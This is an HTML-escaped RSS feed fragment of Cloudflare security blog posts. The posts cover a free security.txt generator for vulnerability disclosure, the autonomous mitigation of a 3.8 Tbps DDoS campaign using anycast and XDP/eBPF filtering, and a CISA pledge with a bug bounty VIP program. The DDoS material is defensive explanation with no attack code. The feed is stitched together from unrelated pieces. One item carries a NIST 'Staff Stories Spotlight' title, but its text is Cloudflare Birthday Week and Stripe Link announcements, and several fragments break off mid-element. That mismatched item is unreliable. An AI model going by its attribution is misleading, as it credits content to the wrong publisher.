          &lt;p&gt;Many organizations turn to CSPM tools to give them more visibility into cloud misconfigurations. These tools often alert teams after an issue occurs, putting security teams in a reactive mode. Remediation efforts require collaboration between security teams and developers to implement changes, which can be time-consuming and resource-intensive. This approach not only delays issue resolution but also exposes companies to compliance and legal risks, while failing to train employees on secure cloud practices. &lt;a href="https://www.ibm.com/reports/data-breach-action-guide"&gt;&lt;u&gt;On average&lt;/u&gt;&lt;/a&gt;, it takes 207 days to identify these breaches and an additional 70 days to contain them. &lt;/p&gt;&lt;p&gt;Addressing the growing threat of cloud misconfigurations requires proactive security measures and continuous monitoring. Organizations must adopt proactive security solutions that not only detect and alert but also prevent misconfigurations from occuring in the first place and enforce best practices. Creating a first line of defense for cloud deployment errors reduces the volume of alerts for customers, especially those also using CSPM tools or CNAPPs. &lt;/p&gt;&lt;p&gt;By implementing these proactive strategies, organizations can safeguard their cloud environments against the evolving landscape of cyber threats, ensuring robust security and compliance while minimizing risks and operational disruptions.&lt;/p&gt;

            &lt;h2&gt;A story of security and simplicity&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#a-story-of-security-and-simplicity"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Meet Georgia, a diligent website administrator at a growing e-commerce company. Every day, Georgia juggles multiple tasks, from managing server uptime to ensuring customer data security. One morning, Georgia receives an email from a security researcher who discovered a potential vulnerability on the website. The researcher struggled to find the right contact information, leading to delays in reporting the issue. Georgia realizes the need for a standardized way to communicate with security researchers, ensuring that vulnerabilities are reported swiftly and efficiently. This is where security.txt comes in.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Why security.txt matters&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#why-security-txt-matters"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;&lt;a href="https://securitytxt.org/"&gt;&lt;u&gt;Security.txt&lt;/u&gt;&lt;/a&gt; is becoming a widely adopted standard among security-conscious organizations. By providing a common location and format for vulnerability disclosure information, it helps bridge the gap between security researchers and organizations. This initiative is supported by major companies and aligns with global security best practices. By offering an automated security.txt generator for free, we aim to empower all of our users to enhance their security measures without additional costs.&lt;/p&gt;&lt;p&gt;In 2020, Cloudflare published the Cloudflare Worker for the security.txt generator as an &lt;a href="https://github.com/cloudflare/securitytxt-worker?cf_history_state=%7B%22guid%22%3A%22C255D9FF78CD46CDA4F76812EA68C350%22%2C%22historyId%22%3A8%2C%22targetId%22%3A%22532D731DBD87B52B996FF5AD5ADDA824%22%7D"&gt;&lt;u&gt;open-source project on GitHub&lt;/u&gt;&lt;/a&gt;, demonstrating our commitment to enhancing web security. This tool is actively used by Cloudflare to streamline vulnerability disclosure processes. However, over the past few years, we've observed a growing demand from our customers for an easier way to implement this standard. In response to this demand and to further support the adoption of security.txt across the Internet, we integrated it directly into our dashboard, making it simple for all our users to enhance their security practices. You can learn more about the initial release and its impact in our previous blog post &lt;a href="https://blog.cloudflare.com/security-dot-txt/"&gt;&lt;u&gt;here&lt;/u&gt;&lt;/a&gt;. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Who can use the free Cloudflare security.txt generator&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#who-can-use-the-free-cloudflare-security-txt-generator"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;This feature is designed for any Cloudflare user who manages a website, from small business owners to large enterprises, from developers to security professionals. Whether you're a seasoned security expert or new to website management, this tool provides an easy way to create and manage your security.txt file in your Cloudflare account, ensuring that you're prepared to handle vulnerability reports effectively.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Technical insights: leveraging Cloudflare’s tools&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#technical-insights-leveraging-cloudflares-tools"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Our security.txt generator is seamlessly integrated into our dashboard. Here's how it works:&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/2z7tEph5hu4T7LCkZU5KFQ/8bc9c8efe332cda618c5dd8bb51e38da/image1.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;When the user enters their data in the Cloudflare Dashboard, the information is immediately stored in a highly available and geo-redundant &lt;a href="https://blog.cloudflare.com/performance-isolation-in-a-multi-tenant-database-environment/"&gt;&lt;u&gt;PostgreSQL database&lt;/u&gt;&lt;/a&gt;. This ensures that all user data is securely kept and can be accessed quickly from any location within our global network.&lt;/p&gt;&lt;p&gt;Instead of creating a static file at the point of data entry, we use a dynamic approach. When a request for the security.txt file is made via the standard .well-known path specified by &lt;a href="https://www.rfc-editor.org/rfc/rfc9116"&gt;&lt;u&gt;RFC 9116&lt;/u&gt;&lt;/a&gt;, our system dynamically constructs the file using the latest data from our database. This method ensures that any updates made by users are reflected in real-time without requiring manual intervention or file regeneration. The data entered by users is synchronized across Cloudflare’s global network using our &lt;a href="https://blog.cloudflare.com/introducing-quicksilver-configuration-distribution-at-internet-scale/"&gt;&lt;u&gt;Quicksilver&lt;/u&gt;&lt;/a&gt; technology. This allows for rapid propagation of changes, ensuring that any updates to the security.txt file are available almost instantaneously across all servers.&lt;/p&gt;&lt;p&gt;Each security.txt file includes an expiration timestamp, which is set during the initial configuration. This timestamp helps alert users when their information may be outdated, encouraging them to review and update their details regularly. For example, if a user sets an expiration date 365 days into the future, they will receive notifications as this date approaches, prompting them to refresh their information.&lt;/p&gt;&lt;p&gt;To ensure compliance with best practices, we also support optional fields such as encryption keys and signatures within the security.txt file. Users can link to their PGP keys for secure communications or include signatures to verify authenticity, enhancing trust with security researchers.&lt;/p&gt;&lt;p&gt;Users who prefer automation can manage their security.txt files through our &lt;a href="https://developers.cloudflare.com/api/operations/update-security-txt"&gt;&lt;u&gt;API&lt;/u&gt;&lt;/a&gt;, allowing seamless integration with existing workflows and tools. This feature enables developers to programmatically update their security.txt configurations without manual dashboard interactions.&lt;/p&gt;&lt;p&gt;Users can also find a view of any missing security.txt files via &lt;a href="https://developers.cloudflare.com/security-center/security-insights/"&gt;&lt;u&gt;Security Insights&lt;/u&gt;&lt;/a&gt; under Security Center.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Available now, and free for all Cloudflare users&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#available-now-and-free-for-all-cloudflare-users"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;By making this feature available to all our users at no cost, we aim to support the security efforts of our entire community, helping you protect your digital assets and foster trust with your audience.&lt;/p&gt;&lt;p&gt;With the introduction of our free security.txt generator, we're taking a significant step towards simplifying security management for everyone. Whether you're a small business owner or a large enterprise, this tool empowers you to adopt industry best practices and ensure that you're ready to handle vulnerability reports effectively. &lt;a href="https://developers.cloudflare.com/security-center/infrastructure/security-file/"&gt;&lt;u&gt;Set up security.txt&lt;/u&gt;&lt;/a&gt; on your websites today!&lt;/p&gt;</content:encoded><guid isPermaLink="false">1uvkAn3IB6vSEO91XsPyAO</guid><category>Better Internet</category><category>Security Posture</category><category>Security</category><category>Standards</category><category>security.txt</category></item><item><title>How Cloudflare auto-mitigated world record 3.8 Tbps DDoS attack</title><link>https://blog.cloudflare.com/how-cloudflare-auto-mitigated-world-record-3-8-tbps-ddos-attack/</link><description>Over the past couple of weeks, Cloudflare's DDoS protection systems have automatically and successfully mitigated multiple hyper-volumetric L3/4 DDoS attacks exceeding 3 billion packets per second (Bpps). Our systems also automatically mitigated multiple attacks exceeding 3 terabits per second (Tbps), with the largest ones exceeding 3.65 Tbps. The scale of these attacks is unprecedented.</description><content:encoded>&lt;p&gt;Since early September, &lt;a href="https://developers.cloudflare.com/ddos-protection/about/components/#autonomous-edge"&gt;&lt;u&gt;Cloudflare's DDoS protection systems&lt;/u&gt;&lt;/a&gt; have been combating a month-long campaign of hyper-volumetric L3/4 DDoS attacks. Cloudflare’s defenses mitigated over one hundred hyper-volumetric L3/4 DDoS attacks throughout the month, with many exceeding 2 billion packets per second (Bpps) and 3 terabits per second (Tbps). The largest attack peaked 3.8 Tbps — the largest ever disclosed publicly by any organization. Detection and mitigation was fully autonomous. The graphs below represent two separate attack events that targeted the same Cloudflare customer and were mitigated autonomously.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7hXUgmEd37kzZrMs0KPXLl/21a4779022bdff91f760dc66759eb955/BLOG-2586_2.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;A mitigated 3.8 Terabits per second DDoS attack that lasted 65 seconds&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1uxvtlkdFoH6KU6waXxK3o/d17fe7cf0e33c20e64a47b3ca0e6ca63/BLOG-2586_3.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;A mitigated 2.14 billion packet per second DDoS attack that lasted 60 seconds&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Cloudflare customers are protected&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#cloudflare-customers-are-protected"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Cloudflare customers using Cloudflare’s HTTP reverse proxy services (e.g. &lt;a href="https://developers.cloudflare.com/waf/"&gt;&lt;u&gt;Cloudflare WAF&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developers.cloudflare.com/cache/"&gt;&lt;u&gt;Cloudflare CDN&lt;/u&gt;&lt;/a&gt;) are automatically protected.&lt;/p&gt;&lt;p&gt;Cloudflare customers using &lt;a href="https://developers.cloudflare.com/spectrum/"&gt;&lt;u&gt;Spectrum&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developers.cloudflare.com/magic-transit/"&gt;&lt;u&gt;Magic Transit&lt;/u&gt;&lt;/a&gt; are also automatically protected. Magic Transit customers can further optimize their protection by deploying &lt;a href="https://developers.cloudflare.com/magic-firewall/"&gt;&lt;u&gt;Magic Firewall&lt;/u&gt;&lt;/a&gt; rules to enforce a strict positive and negative security model at the packet layer.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Other Internet properties may not be safe&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#other-internet-properties-may-not-be-safe"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;The scale and frequency of these attacks are unprecedented. Due to their sheer size and bits/packets per second rates, these attacks have the ability to take down unprotected Internet properties, as well as Internet properties that are protected by on-premise equipment or by cloud providers that just don’t have sufficient network capacity or global coverage to be able to handle these volumes alongside legitimate traffic without impacting performance. &lt;/p&gt;&lt;p&gt;Cloudflare, however, does have the network capacity, global coverage, and intelligent systems needed to absorb and automatically mitigate these monstrous attacks. &lt;/p&gt;&lt;p&gt;In this blog post, we will review the attack campaign and why its attacks are so severe. We will describe the anatomy of a Layer 3/4 DDoS attack, its objectives, and how attacks are generated. We will then proceed to detail how Cloudflare’s systems were able to autonomously detect and mitigate these monstrous attacks without impacting performance for our customers. We will describe the key aspects of our defenses, starting with how our systems generate real-time (dynamic) signatures to match the attack traffic all the way to how we leverage kernel features to drop packets at wire-speed.&lt;/p&gt;

            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;We have observed this attack campaign targeting multiple customers in the financial services, Internet, and telecommunication industries, among others. This attack campaign targets bandwidth saturation as well as resource exhaustion of in-line applications and devices.&lt;/p&gt;&lt;p&gt;The attacks predominantly leverage &lt;a href="https://www.cloudflare.com/learning/ddos/glossary/user-datagram-protocol-udp/"&gt;&lt;u&gt;UDP&lt;/u&gt;&lt;/a&gt; on a fixed port, and originated from across the globe with larger shares coming from Vietnam, Russia, Brazil, Spain, and the US. &lt;/p&gt;&lt;p&gt;The high packet rate attacks appear to originate from multiple types of compromised devices, including MikroTik devices, DVRs, and Web servers, orchestrated to work in tandem and flood the target with exceptionally large volumes of traffic. The high bitrate attacks appear to originate from a large number of compromised ASUS home routers, likely exploited using &lt;a href="https://censys.com/june-20-improper-authentication-vulnerability-in-asus-routers/"&gt;&lt;u&gt;a CVE 9.8 (Critical) vulnerability that was recently discovered by Censys&lt;/u&gt;&lt;/a&gt;.&lt;/p&gt;&lt;div&gt;

          &lt;div&gt;
            &lt;h2&gt;Anatomy of DDoS attacks&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#anatomy-of-ddos-attacks"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Before we discuss how Cloudflare automatically detected and mitigated the largest DDoS attacks ever seen, it‘s important to understand the basics of DDoS attacks. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/7HLtAHnyjS33iiJAR1B9h9/2e1fc2cab871440fc95fa803989ae156/BLOG-2586_5.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Simplified diagram of a DDoS attack&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;The goal of a &lt;a href="https://www.cloudflare.com/learning/ddos/what-is-a-ddos-attack/"&gt;&lt;u&gt;Distributed Denial of Service (DDoS) attack&lt;/u&gt;&lt;/a&gt; is to deny legitimate users access to a service. This is usually done by exhausting resources needed to provide the service. In the context of these recent Layer 3/4 DDoS attacks, that resource is CPU cycles and network bandwidth.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Exhausting CPU cycles&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#exhausting-cpu-cycles"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Processing a packet consumes CPU cycles. In the case of regular (non-attack) traffic, a &lt;i&gt;legitimate&lt;/i&gt; packet received by a service will cause that service to perform some action, and different actions require different amounts of CPU processing. However, before a packet is even delivered to a service there is per-packet work that needs to be done. Layer 3 packet headers need to be parsed and processed to deliver the packet to the correct machine and interface. Layer 4 packet headers need to be processed and routed to the correct socket (if any). There may be multiple additional processing steps that inspect every packet. Therefore, if an attacker sends at a high enough packet rate, then they can potentially saturate the available CPU resources, denying service to legitimate users.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3aBbNG4Fc7TY6MTugLl3BE/064fb17761aebbce737a5a4518a14235/BLOG-2586_6.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;To defend against high packet rate attacks, you need to be able to inspect and discard the bad packets using as few CPU cycles as possible, leaving enough CPU to process the good packets. You can additionally acquire more, or faster, CPUs to perform the processing — but that can be a very lengthy process that bears high costs. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Exhausting network bandwidth&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#exhausting-network-bandwidth"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Network bandwidth is the total amount of data per time that can be delivered to a server. You can think of bandwidth like a pipe to transport water. The amount of water we can deliver through a drinking straw is less than what we could deliver through a garden hose. If an attacker is able to push more garbage data into the pipe than it can deliver, then both the bad data &lt;i&gt;and&lt;/i&gt; the good data will be discarded upstream, at the entrance to the pipe, and the DDoS is therefore successful.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/OehVItOhGfP9ApllRvDDM/fce73e6f375173a1a53bc22026e0b9b1/BLOG-2586_7.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;
Defending against attacks that can saturate network bandwidth can be difficult because there is very little that can be done if you are on the downstream side of the saturated pipe. There are really only a few choices: you can get a bigger pipe, you can potentially find a way to move the good traffic to a new pipe that isn’t saturated, or you can hopefully ask the upstream side of the pipe to stop sending some or all of the data into the pipe.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Generating DDoS attacks&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#generating-ddos-attacks"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;If we think about what this means from the attackers point of view you realize there are similar constraints. Just as it takes CPU cycles to receive a packet, it also takes CPU cycles to create a packet. If, for example, the cost to send and receive a packet were equal, then the attacker would need an equal amount of CPU power to generate the attack as we would need to defend against it. In most cases this is not true — there is a cost asymmetry, as the attacker is able to generate packets using fewer CPU cycles than it takes to receive those packets. However, it is worth noting that generating attacks is not free and can require a large amount of CPU power.&lt;/p&gt;&lt;p&gt;Saturating network bandwidth can be even more difficult for an attacker. Here the attacker needs to be able to output more bandwidth than the target service has allocated. They actually need to be able to exceed the capacity of the receiving service. This is so difficult that the most common way to achieve a network bandwidth attack is to use a reflection/amplification attack method, for example a &lt;a href="https://www.cloudflare.com/learning/ddos/dns-amplification-ddos-attack/"&gt;&lt;u&gt;DNS Amplification attack&lt;/u&gt;&lt;/a&gt;. These attacks allow the attacker to send a small packet to an intermediate service, and the intermediate service will send a large packet to the victim.&lt;/p&gt;&lt;p&gt;In both scenarios, the attacker needs to acquire or gain access to many devices to generate the attack. These devices can be acquired in a number of different ways. They may be server class machines from cloud providers or hosting services, or they can be compromised devices like DVRs, routers, and webcams that have been infected with the attacker’s malware. These machines together form the botnet.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;How Cloudflare defends against large attacks&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-cloudflare-defends-against-large-attacks"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Now that we understand the fundamentals of how DDoS attacks work, we can explain how Cloudflare can defend against these attacks.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Spreading the attack surface using global anycast&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#spreading-the-attack-surface-using-global-anycast"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;The first not-so-secret ingredient is that Cloudflare’s network is built on &lt;a href="https://www.cloudflare.com/learning/cdn/glossary/anycast-network/"&gt;&lt;u&gt;anycast&lt;/u&gt;&lt;/a&gt;. In brief, anycast allows a single IP address to be advertised by multiple machines around the world. A packet sent to that IP address will be served by the closest machine. This means when an attacker uses their distributed botnet to launch an attack, the attack will be received in a distributed manner across the Cloudflare network. An infected DVR in Dallas, Texas will send packets to a Cloudflare server in Dallas. An infected webcam in London will send packets to a Cloudflare server in London.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/48tW6A6ACUT4Fd9h3l70F4/c6bcea8f037fc853477d0987c939e007/BLOG-2586_8.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Anycast vs. Unicast networks&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Our anycast network additionally allows Cloudflare to allocate compute and bandwidth resources closest to the regions that need them the most. Densely populated regions will generate larger amounts of legitimate traffic, and the data centers placed in those regions will have more bandwidth and CPU resources to meet those needs. Sparsely populated regions will naturally generate less legitimate traffic, so Cloudflare data centers in those regions can be sized appropriately. Since attack traffic is mainly coming from compromised devices, those devices will tend to be distributed in a manner that matches normal traffic flows sending the attack traffic proportionally to datacenters that can handle it. And similarly, within the datacenter, traffic is distributed across multiple machines.&lt;/p&gt;&lt;p&gt;Additionally, for high bandwidth attacks, Cloudflare’s network has another advantage. A large proportion of traffic on the Cloudflare network does not consume bandwidth in a symmetrical manner. For example, an HTTP request to get a webpage from a site behind Cloudflare will be a relatively small incoming packet, but produce a larger amount of outgoing traffic back to the client. This means that the Cloudflare network tends to egress far more legitimate traffic than we receive. However, the network links and bandwidth allocated are symmetrical, meaning there is an abundance of ingress bandwidth available to receive volumetric attack traffic.&lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Generating real-time signatures&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#generating-real-time-signatures"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;By the time you’ve reached an individual server inside a datacenter, the bandwidth of the attack has been distributed enough that none of the upstream links are saturated. That doesn’t mean the attack has been fully stopped yet, since we haven’t dropped the bad packets. To do that, we need to sample traffic, qualify an attack, and create rules to block the bad packets. &lt;/p&gt;&lt;p&gt;Sampling traffic and dropping bad packets is the job of our &lt;a href="https://blog.cloudflare.com/l4drop-xdp-ebpf-based-ddos-mitigations/"&gt;&lt;u&gt;l4drop&lt;/u&gt;&lt;/a&gt; component, which uses &lt;a href="https://netdevconf.info/2.1/papers/Gilberto_Bertin_XDP_in_practice.pdf"&gt;&lt;u&gt;XDP (eXpress Data Path)&lt;/u&gt;&lt;/a&gt; and leverages an extended version of the Berkeley Packet Filter known as &lt;a href="https://blog.cloudflare.com/tag/ebpf/"&gt;&lt;u&gt;eBPF (extended BPF)&lt;/u&gt;&lt;/a&gt;. This enables us to execute custom code in kernel space and process (drop, forward, or modify) each packet directly at the network interface card (NIC) level. This component helps the system drop packets efficiently without consuming excessive CPU resources on the machine. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/1NUxGTvKFs5l6G2UCSxvqw/3632f6728f9361123169d9694c807f0b/BLOG-2586_9.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Cloudflare DDoS protection system overview&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;We use XDP to sample packets to look for suspicious attributes that indicate an attack. The samples include fields such as the source IP, source port, destination IP, destination port, protocol, TCP flags, sequence number, options, packet rate and more. This analysis is conducted by the &lt;i&gt;denial of service daemon (dosd).&lt;/i&gt; &lt;i&gt;Dosd&lt;/i&gt; holds our secret sauce. It has many &lt;i&gt;filters&lt;/i&gt; which instruct it, based on our curated heuristics, when to initiate mitigation. To our customers, these filters are logically grouped by attack vectors and exposed as the &lt;a href="https://developers.cloudflare.com/ddos-protection/managed-rulesets/"&gt;&lt;u&gt;DDoS Managed Rules&lt;/u&gt;&lt;/a&gt;. Our customers can &lt;a href="https://developers.cloudflare.com/ddos-protection/managed-rulesets/adjust-rules/"&gt;&lt;u&gt;customize their behavior&lt;/u&gt;&lt;/a&gt; to some extent, as needed.&lt;/p&gt;&lt;p&gt;As it receives samples from XDP, dosd will generate multiple permutations of fingerprints for suspicious traffic patterns. Then, using a data streaming algorithm, dosd will identify the most optimal fingerprints to mitigate the attack. Once an attack is qualified, dosd will push a mitigation rule inline as an eBPF program to surgically drop the attack traffic. &lt;/p&gt;&lt;p&gt;The detection and mitigation of attacks by dosd is done at the server level, at the data center level and at the global level — and it’s all software defined. This makes our network extremely resilient and leads to almost instant mitigation. There are no out-of-path “scrubbing centers” or “scrubbing devices”. Instead, each server runs the full stack of the Cloudflare product suite including the DDoS detection and mitigation component. And it is all done autonomously. Each server also &lt;i&gt;gossips (multicasts)&lt;/i&gt; mitigation instructions within a data center between servers, and globally between data centers. This ensures that whether an attack is localized or globally distributed, dosd will have already installed mitigation rules inline to ensure a robust mitigation.&lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Strong defenses against strong attacks&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#strong-defenses-against-strong-attacks"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Our software-defined, autonomous DDoS detection and mitigation systems run across our entire network. In this post we focused mainly on our dynamic fingerprinting capabilities, but our arsenal of defense systems is much larger. The &lt;a href="https://developers.cloudflare.com/ddos-protection/tcp-protection/"&gt;&lt;u&gt;Advanced TCP Protection&lt;/u&gt;&lt;/a&gt; system and &lt;a href="https://developers.cloudflare.com/ddos-protection/dns-protection/"&gt;&lt;u&gt;Advanced DNS Protection&lt;/u&gt;&lt;/a&gt; system work alongside our dynamic fingerprinting to identify sophisticated and highly randomized TCP-based DDoS attacks and also leverages statistical analysis to thwart complex DNS-based DDoS attacks. Our defenses also incorporate real-time threat intelligence, traffic profiling, and machine learning classification as part of our &lt;a href="https://developers.cloudflare.com/ddos-protection/managed-rulesets/adaptive-protection/"&gt;&lt;u&gt;Adaptive DDoS Protection&lt;/u&gt;&lt;/a&gt; to mitigate traffic anomalies. &lt;/p&gt;&lt;p&gt;Together, these systems, alongside the full breadth of the Cloudflare Security portfolio, are built atop of the Cloudflare network — one of the largest networks in the world — to ensure our customers are protected from the largest attacks in the world.&lt;/p&gt;</content:encoded><guid isPermaLink="false">4j6QWqeVFn6qzs0Md0LK7h</guid><category>DDoS</category><category>Attacks</category><category>Trends</category><category>Security</category></item><item><title>Staff Stories Spotlight Series: Cybersecurity Awareness Month 2024</title><link>https://www.nist.gov/blogs/cybersecurity-insights/staff-stories-spotlight-series-cybersecurity-awareness-month-2024-3</link><description>This blog is part of a larger NIST series during the month of October for Cybersecurity Awareness Month , called 'Staff Stories Spotlight.'

Birthday Week each year is packed with major announcements and the release of innovative new offerings, all focused on giving back to our customers and the broader Internet community. Birthday Week has become a proud tradition at Cloudflare and our culture, to not just stay true to our mission, but to always stay close to our customers. We begin planning for this week of celebration earlier in the year and invite everyone at Cloudflare to participate.&lt;/p&gt;&lt;p&gt;Months before Birthday Week, we invited teams to submit ideas for what to announce. We were flooded with submissions, from proposals for implementing new standards to creating new products for developers. Our biggest challenge is finding space for it all in just one week — there is still so much to build. Good thing we have a birthday to celebrate each year, but we might need an extra day in Birthday Week next year!&lt;/p&gt;&lt;p&gt;In case you missed it, here’s everything we announced during 2024’s Birthday Week:&lt;/p&gt;

          &lt;/figure&gt;&lt;p&gt;Cloudflare serves millions of customers and their millions of domains across nearly every country on Earth. However, as a global company, the payment landscape can be complex — especially in regions outside of North America. While credit cards are very popular for online purchases in the US, the global picture is quite different. &lt;a href="https://www.fisglobal.com/-/media/fisglobal/files/campaigns/global-payments%20report/FIS_TheGlobalPaymentsReport_2023.pdf"&gt;&lt;u&gt;60% of consumers across EMEA, APAC and LATAM choose alternative payment methods&lt;/u&gt;&lt;/a&gt;. For instance, European consumers often opt for SEPA Direct Debit, a bank transfer mechanism, while Chinese consumers frequently use Alipay, a digital wallet.&lt;/p&gt;&lt;p&gt;At Cloudflare, we saw this as an opportunity to meet customers where they are. Today, we're thrilled to announce that we are expanding our payment system and launching a closed beta for a new payment method called &lt;a href="https://www.cloudflare.com/lp/cloudflare-introduces-stripe-link/"&gt;&lt;u&gt;Stripe Link&lt;/u&gt;&lt;/a&gt;. The checkout experience will be faster and more seamless, allowing our self-serve customers to pay using saved bank accounts or cards with Link. Customers who have saved their payment details at any business using Link can quickly check out without having to reenter their payment information.&lt;/p&gt;&lt;p&gt;These are the first steps in our efforts to expand our payment system to support global payment methods used by customers around the world.&lt;b&gt; &lt;/b&gt;We'll be rolling out new payment methods gradually, ensuring a smooth integration and gathering feedback from our customers every step of the way.&lt;/p&gt;
          &lt;figure&gt;

In line with this commitment, we're enhancing our vulnerability disclosure policy by launching a VIP bug bounty program, giving top researchers early access to our products. Keep an eye out for future updates regarding Cloudflare's CISA pledge as we work together to shape a safer digital future.</description><content:encoded>&lt;p&gt;As our digital world becomes increasingly more complex, the importance of cybersecurity grows ever more critical. As a result, Cloudflare is proud to promote our commitment to the &lt;a href="https://cisa.gov/"&gt;&lt;u&gt;Cybersecurity and Infrastructure Security Agency (CISA)&lt;/u&gt;&lt;/a&gt; &lt;a href="https://www.cisa.gov/securebydesign"&gt;&lt;u&gt;‘Secure by Design’&lt;/u&gt;&lt;/a&gt; &lt;a href="https://www.cisa.gov/securebydesign/pledge"&gt;&lt;u&gt;pledge&lt;/u&gt;&lt;/a&gt;. The commitment is built around seven security goals, aimed at enhancing the safety of our products and delivering the most secure solutions to our customers.&lt;/p&gt;&lt;p&gt;Cloudflare’s commitment to the CISA pledge reflects our dedication to transparency and accountability to our customers, and to cybersecurity best practices. Furthermore, Cloudflare is committed to being a trusted partner by sharing our strategies to ensure the highest priority is placed on safeguarding our customers’ security. &lt;/p&gt;
          &lt;div&gt;
            &lt;h2&gt;Bug bounty VIP program&lt;/h2&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#bug-bounty-vip-program"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
          &lt;p&gt;Cloudflare has successfully managed a &lt;a href="https://blog.cloudflare.com/cloudflare-bug-bounty-program/"&gt;&lt;u&gt;public Vulnerability Disclosure Program (VDP)&lt;/u&gt;&lt;/a&gt; for years; our belief is that collaboration is the cornerstone of effective cybersecurity. We are excited to announce a major milestone in our journey to meet &lt;a href="https://www.cisa.gov/securebydesign/pledge#:~:text=READ%20MORE-,Vulnerability%20disclosure%20policy,-Goal%3A%20Within%20one"&gt;&lt;u&gt;Goal #5 of the pledge&lt;/u&gt;&lt;/a&gt;: our program will now include a bug bounty VIP program in conjunction with our bug bounty public program.&lt;/p&gt;&lt;p&gt;Continuous investment in maturing our bug bounty program is a vital tool for the success of any security organization. By encouraging broader participation in vulnerability testing, we open the door to more diverse perspectives and expertise, ultimately leading to stronger, more resilient security measures. Additionally, the new VIP program will allow us greater flexibility in engaging security researchers on upcoming betas for Cloudflare products, and will allow us to award higher bounty payouts.&lt;/p&gt;&lt;p&gt;Our commitment to this effort underscores our belief that a safer Internet is achievable through shared responsibility and proactive engagement. The security team at Cloudflare is looking forward to implementing a more proactive approach to securing our products with the launch of the new bug bounty VIP program!&lt;/p&gt;
          &lt;div&gt;
